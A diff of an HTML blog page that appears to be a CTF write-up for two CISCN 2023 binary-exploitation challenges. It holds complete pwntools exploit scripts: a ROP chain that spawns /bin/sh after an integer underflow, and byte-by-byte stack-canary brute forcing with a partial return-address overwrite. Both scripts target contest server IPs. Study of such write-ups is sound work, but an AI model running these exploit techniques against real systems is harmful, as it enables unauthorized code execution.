@@ -59,8 +59,6 @@
     <div class="date">2023 May 29th</div>
     <div class="tags">
       
-      <div class="tag-item">CTF</div>
-      
       <div class="tag-item">PWN</div>
       
       <div class="tag-item">wp</div>
@@ -74,13 +72,200 @@
 </blockquote>
 <h1 id="shaokao"><a href="#shaokao" class="headerlink" title="shaokao"></a>shaokao</h1><p>整型下溢，然后有个栈溢出，直接用ROPgadget生成ropchain</p>
 <p><img src="/../img/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3.assets/image-20230528173718539.png" alt="image-20230528173718539"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">	gdb.attach(p, cmd)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;123.56.251.120&quot;</span></span><br><span class="line">port = <span class="number">36293</span></span><br><span class="line"><span class="comment">#pl = process(&quot;./shaokao&quot;)</span></span><br><span class="line">pl = remote(host,  port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line">pl.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line">pl.sendline(<span class="string">&quot;-1145144&quot;</span>)</span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="string">b&quot;a&quot;</span>*<span class="number">40</span></span><br><span class="line"></span><br><span class="line">p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += p64(<span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += p64(<span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += p64(<span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line">pl.sendline(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pl.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python2
+from pwn import*
+
+context(os = &#39;linux&#39;, arch = &#39;amd64&#39;, log_level = &#39;debug&#39;)
+def debug(cmd=&#39;&#39;):
+    cmd += &quot;b main\n&quot;
+    gdb.attach(p, cmd)
+    pause()
+
+host = &quot;123.56.251.120&quot;
+port = 36293
+#pl = process(&quot;./shaokao&quot;)
+pl = remote(host,  port)
+
+# debug()
+pl.recvuntil(&quot;&gt; &quot;)
+pl.sendline(&quot;1&quot;)
+pl.recv()
+pl.sendline(&quot;1&quot;)
+pl.recv()
+pl.sendline(&quot;-1145144&quot;)
+pl.recvuntil(&quot;&gt; &quot;)
+pl.sendline(&quot;4&quot;)
+pl.recvuntil(&quot;&gt; &quot;)
+pl.sendline(&quot;5&quot;)
+pl.recv()
 
 
+p = b&quot;a&quot;*40
 
+p += p64(0x000000000040a67e) # pop rsi ; ret
+p += p64(0x00000000004e60e0) # @ .data
+p += p64(0x0000000000458827) # pop rax ; ret
+p += b&#39;/bin//sh&#39;
+p += p64(0x000000000045af95) # mov qword ptr [rsi], rax ; ret
+p += p64(0x000000000040a67e) # pop rsi ; ret
+p += p64(0x00000000004e60e8) # @ .data + 8
+p += p64(0x0000000000447339) # xor rax, rax ; ret
+p += p64(0x000000000045af95) # mov qword ptr [rsi], rax ; ret
+p += p64(0x000000000040264f) # pop rdi ; ret
+p += p64(0x00000000004e60e0) # @ .data
+p += p64(0x000000000040a67e) # pop rsi ; ret
+p += p64(0x00000000004e60e8) # @ .data + 8
+p += p64(0x00000000004a404b) # pop rdx ; pop rbx ; ret
+p += p64(0x00000000004e60e8) # @ .data + 8
+p += p64(0x4141414141414141) # padding
+p += p64(0x0000000000447339) # xor rax, rax ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000402404) # syscall
+pl.sendline(p)
+
+
+pl.interactive()
+</code></pre>
 <h1 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h1><p>fork子进程崩溃不改变canary,利用该性质逐字节爆破canary,发现后门函数，直接覆盖前两位地址，第三位直接猜</p>
 <p><img src="/../img/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3.assets/image-20230528173814568.png" alt="image-20230528173814568"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">	gdb.attach(p, cmd)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;123.57.248.214&quot;</span></span><br><span class="line">port = <span class="number">25775</span></span><br><span class="line"><span class="comment">#pt = process(&quot;./funcanary&quot;)</span></span><br><span class="line">pt = remote(host, port)</span><br><span class="line"></span><br><span class="line">pt.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;the &quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="built_in">chr</span>(i)</span><br><span class="line">        pt.send(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary + <span class="built_in">chr</span>(i))</span><br><span class="line">        a = pt.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> a</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;fun&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">                canary += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;canary: &quot;</span> + canary</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;canary: &quot;</span> + canary</span><br><span class="line"></span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x02&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x12&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x22&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x32&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x42&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x52&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x62&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x72&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x82&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x92&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xa2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xb2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xc2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xd2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xe2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xf2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pt.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python2
+from pwn import*
+
+context(os = &#39;linux&#39;, arch = &#39;amd64&#39;, log_level = &#39;debug&#39;)
+def debug(cmd=&#39;&#39;):
+    cmd += &quot;b main\n&quot;
+    gdb.attach(p, cmd)
+    pause()
+
+host = &quot;123.57.248.214&quot;
+port = 25775
+#pt = process(&quot;./funcanary&quot;)
+pt = remote(host, port)
+
+pt.recvuntil(&quot;welcome\n&quot;)
+canary = &#39;\x00&#39;
+for k in range(7):
+    for i in range(256):
+        print &quot;the &quot; + str(k) + &quot;: &quot; + chr(i)
+        pt.send(&#39;a&#39;*(0x70-8) + canary + chr(i))
+        a = pt.recvuntil(&quot;welcome\n&quot;)
+        print a
+        if &quot;fun&quot; in a:
+                canary += chr(i)
+                print &quot;canary: &quot; + canary
+                break
+print &quot;canary: &quot; + canary
+
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x02&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x12&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x22&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x32&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x42&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x52&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x62&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x72&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x82&#39;
+pt.send(pyload)
